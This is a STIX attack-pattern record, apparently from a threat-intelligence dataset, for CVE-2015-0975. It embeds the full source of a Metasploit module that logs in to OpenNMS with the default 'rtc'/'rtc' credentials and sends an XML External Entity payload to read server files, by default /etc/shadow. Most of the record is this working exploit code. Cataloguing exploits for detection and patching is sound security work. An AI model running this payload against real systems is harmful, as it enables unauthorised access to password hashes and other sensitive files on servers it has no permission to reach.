{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5885ecb2-c3f9-4d8a-91de-5e3fe685be7e",
    "created": "2024-08-14T16:31:43.281168Z",
    "modified": "2024-08-14T16:31:43.281172Z",
    "name": "OpenNMS Authenticated XXE",
    "description": " OpenNMS is vulnerable to XML External Entity Injection in the Real-Time Console interface. Although this attack requires authentication, there are several factors that increase the severity of this vulnerability.  1. OpenNMS runs with root privileges, taken from the OpenNMS FAQ: \"The difficulty with the core of OpenNMS is that these components need to run as root to be able to bind to low-numbered ports or generate network traffic that requires root\"  2. The user that you must authenticate as is the \"rtc\" user which has the default password of \"rtc\". There is no mention of this user in the installation guides found here: http://www.opennms.org/wiki/Tutorial_Installation, only mention that you should change the default admin password of \"admin\" for security purposes.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/opennms_xxe.rb",
            "external_id": "opennms_xxe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0975"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'OpenNMS Authenticated XXE',\n      'Description'    => %q{\n      OpenNMS is vulnerable to XML External Entity Injection in the Real-Time Console interface.\n      Although this attack requires authentication, there are several factors that increase the\n      severity of this vulnerability.\n\n      1. OpenNMS runs with root privileges, taken from the OpenNMS FAQ: \"The difficulty with the\n      core of OpenNMS is that these components need to run as root to be able to bind to low-numbered\n      ports or generate network traffic that requires root\"\n\n      2. The user that you must authenticate as is the \"rtc\" user which has the default password of\n      \"rtc\". There is no mention of this user in the installation guides found here:\n      http://www.opennms.org/wiki/Tutorial_Installation, only mention that you should change the default\n      admin password of \"admin\" for security purposes.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n          'Stephen Breen <breenmachine[at]gmail.com>', # discovery\n          'Justin Kennedy <jstnkndy[at]gmail.com>', # metasploit module\n        ],\n      'References'     => [\n          ['CVE', '2015-0975']\n        ],\n      'DisclosureDate' => '2015-01-08'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8980),\n        OptBool.new('SSL', [false, 'Use SSL', false]),\n        OptString.new('TARGETURI', [ true, \"The base path to the OpenNMS application\", '/opennms/']),\n        OptString.new('FILEPATH', [true, \"The file or directory to read on the server\", \"/etc/shadow\"]),\n        OptString.new('USERNAME', [true, \"The username to authenticate with\", \"rtc\"]),\n        OptString.new('PASSWORD', [true, \"The password to authenticate with\", \"rtc\"])\n      ])\n\n  end\n\n  def run\n\n    print_status(\"Logging in to grab a valid session cookie\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'j_spring_security_check'),\n      'vars_post' => {\n        'j_username' => datastore['USERNAME'],\n        'j_password' => datastore['PASSWORD'],\n        'Login'=> 'Login'\n      },\n    })\n\n    if res.nil?\n      fail_with(Failure::Unreachable, \"No response from POST request\")\n    elsif res.code != 302\n      fail_with(Failure::UnexpectedReply, \"Non-302 response from POST request\")\n    end\n\n    unless res.headers[\"Location\"].include? \"index.jsp\"\n      fail_with(Failure::NoAccess, 'Authentication failed')\n    end\n\n    cookie = res.get_cookies\n\n    print_status(\"Got cookie, going for the goods\")\n\n    rand_doctype = Rex::Text.rand_text_alpha(rand(1..10))\n    rand_entity1 = Rex::Text.rand_text_alpha(rand(1..10))\n    rand_entity2 = Rex::Text.rand_text_alpha(rand(1..10))\n    delimiter = SecureRandom.uuid\n\n    xxe = %Q^<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE #{rand_doctype} [\n    <!ELEMENT #{rand_entity1} ANY >\n    <!ENTITY #{rand_entity2} SYSTEM \"file://#{datastore[\"FILEPATH\"]}\" >\n    ]><#{rand_entity1}>#{delimiter}&#{rand_entity2};#{delimiter}</#{rand_entity1}>^\n\n    res = send_request_raw({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'rtc', 'post/'),\n      'data'   => xxe,\n      'cookie' => cookie\n    })\n\n    # extract filepath data from response\n    if res && res.code == 400 && res.body =~ /title.+#{delimiter}(.+)#{delimiter}.+title/m\n      result = $1\n      print_good(\"#{result}\")\n    else\n      fail_with(Failure::Unknown, 'Error fetching file, try another')\n    end\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2015-01-08"
}